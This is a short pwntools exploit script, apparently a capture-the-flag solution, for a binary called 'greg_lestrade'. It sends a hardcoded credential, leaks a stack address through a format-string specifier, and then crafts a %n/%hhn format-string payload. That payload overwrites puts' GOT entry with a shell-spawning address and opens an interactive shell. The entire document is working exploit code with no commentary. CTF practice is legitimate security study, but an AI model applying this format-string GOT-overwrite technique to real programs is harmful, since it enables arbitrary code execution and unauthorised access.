from pwn import *

context.clear(arch='amd64')
p = process("./greg_lestrade")

print p.recv()
credential = "7h15_15_v3ry_53cr37_1_7h1nk"
payload = credential
p.send(payload)
print payload
print p.recv()
p.sendline("1")
print p.recv()
p.send("d"*0x300+"%138$9p")		# stack address leak
p.recvuntil("0x")
stack_addr = int(p.recvuntil("0) ")[:-3],16)-0x68
print p.recv()
log.info("stack_addr = " + hex(stack_addr))
p.sendline("1")
print p.recv()

puts_got = 0x602020
sh = 0x400876

payload = "%40$n"
payload += "a"*0x08
payload += "%41$hhn"
payload += "a"*(0x40-0x08)
payload += "%42$hhn"
payload += "a"*(0x76-0x40)
payload += "%43$hhn"
payload += "d"*(255 - len(payload)) + "\x00"
payload += p64(puts_got+3)
payload += p64(puts_got+1)
payload += p64(puts_got+2)
payload += p64(puts_got)

p.send(payload)
p.interactive()

